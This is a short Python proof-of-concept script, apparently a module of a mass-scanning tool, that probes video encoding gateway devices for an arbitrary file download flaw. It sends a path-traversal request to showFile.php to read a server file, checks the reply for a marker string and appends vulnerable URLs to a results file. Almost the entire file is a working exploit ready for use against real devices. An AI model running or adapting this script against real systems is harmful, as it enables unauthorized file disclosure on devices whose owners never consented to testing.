import requests
import time
import buter

filename = "./reps/hkvs视频编码设备接入网关showFile任意文件下载-"+str(time.strftime("%Y-%m-%d", time.localtime()))
poc = '/serverLog/showFile.php?fileName=../web/html/main.php'

headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }

data = '''<?php
          $file_name = $_GET['fileName'];
          $file_path = '../../../log/'.$file_name;
          $fp = fopen($file_path, "r");
          while($line = fgets($fp)){
            $line = nl2br(htmlentities($line, ENT_COMPAT, "utf-8"));
            echo '<span style="font-size:16px">'.$line.'</span>';
          }
          fclose($fp);
?>'''


def hkvedagsfiledown(url):
    try:
        rep = requests.post(url=url+ poc, headers=headers, data=data,timeout=3)
        response_text = rep.content.decode('utf-8')
        # print(response_text)
        if rep.status_code==200 and 'getCurDate' in rep.text:
            print(buter.colors.GREEN + f"存在hkvs视频编码设备接入网关showFile任意文件下载 url : {url}" + buter.colors.END)
            f =open(filename,"a+",encoding="utf-8")
            f.write(rep.url)
            f.write("\n")
            f.close()

        else:
            print(buter.colors.RED + f"未发现hkvs视频编码设备接入网关showFile任意文件下载 url : {url}" + buter.colors.END)

    except Exception as e:
        print(buter.colors.END + f"ERROR : {e}" + buter.colors.END)


